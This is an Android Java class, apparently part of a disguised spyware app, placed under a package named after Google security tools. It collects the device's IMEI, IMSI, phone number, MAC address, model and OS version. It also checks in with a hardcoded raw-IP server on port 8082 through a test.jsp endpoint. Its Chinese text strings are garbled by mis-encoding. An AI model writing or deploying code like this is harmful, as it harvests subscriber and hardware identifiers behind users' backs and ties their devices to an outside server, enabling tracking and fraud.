package com.google.security.tools;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;


import android.content.Context;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.telephony.TelephonyManager;
import android.util.Log;

public class GetTeleInfoTool {
	static Context context;
	public GetTeleInfoTool(Context con) {
		// TODO Auto-generated constructor stub
		GetTeleInfoTool.context = con;
	}
	public static String getUidOrimei() {
		String imei = "000000000000000";
		try {
			TelephonyManager telephonyManager = (TelephonyManager) context
					.getSystemService(context.TELEPHONY_SERVICE);
			imei = telephonyManager.getDeviceId();
			Log.i("imei", imei);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return imei;
	}

	public static String getImsi() {
		String imsi = "00000000";
		try {
			TelephonyManager telephonyManager = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			imsi = telephonyManager.getSubscriberId();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return imsi;
	}

	public static String getNumber() {
		String number = "NoCard";
		try {
			TelephonyManager telephonyManager = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			number = telephonyManager.getLine1Number();

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();

		}
		return number;
	}

	public static String getMac() {
		String mac = "unknown";
		try {
			WifiManager wifi = (WifiManager) context
					.getSystemService(Context.WIFI_SERVICE);
			WifiInfo info = wifi.getConnectionInfo();
			mac = info.getMacAddress();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return mac;
	}

	public static String getNetworktype() {
		String type = "ÍøÂçÀàÐÍÎ´Öª";
		int t = 0;
		try {
			TelephonyManager telephonyManager = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			t = telephonyManager.getNetworkType();
			if (t == 1) {
				type = "GPRSÍøÂç";
			} else if (t == 2) {
				type = "EDGEÍøÂç";
			} else if (t == 3) {
				type = "UMTSÍøÂç";
			} else if (t == 8) {
				type = "HSDPAÍøÂç";
			} else if (t == 9) {
				type = "HSUPAÍøÂç";
			} else if (t == 10) {
				type = "HSPAÍøÂç";
			} else if (t == 4) {
				type = "CDMAÍøÂç,IS95A »ò IS95B";
			} else if (t == 5) {
				type = "EVDOÍøÂç, revision 0";
			} else if (t == 6) {
				type = "EVDOÍøÂç, revision A";
			} else if (t == 7) {
				type = "1xRTTÍøÂç";
			}
		} catch (Exception e) {
			// TODO: handle exception
		}
		return type;
	}

	public static String getModel() {
		String model = "unknown";
		try {
			model = android.os.Build.MODEL;
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return model;
	}

	public static String getVersion() {
		String version = "unknown";
		try {
			version = android.os.Build.VERSION.RELEASE;
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return version;
	}

	public static String getOnline() {
		String isOnline;
		String result = "";
		String target = "";
		target = "http://111.204.189.55:8082/a/b/cd/efg/test.jsp?content=test";
		URL url;
		try {
			url = new URL(target);
			HttpURLConnection urlConn = (HttpURLConnection) url
					.openConnection();
			InputStreamReader in = new InputStreamReader(
					urlConn.getInputStream());
			BufferedReader buffer = new BufferedReader(in);
			String inputLine = null;
			while ((inputLine = buffer.readLine()) != null) {
				result += inputLine;
			}
			in.close();
			urlConn.disconnect();
		} catch (Exception e) {
			// TODO: handle exception
			e.printStackTrace();
		}
		if (result.equals("testsuccess")) {
			isOnline = "ÔÚÏß";
		} else {
			isOnline = "ÀëÏß";
		}
		return isOnline;
	}
}
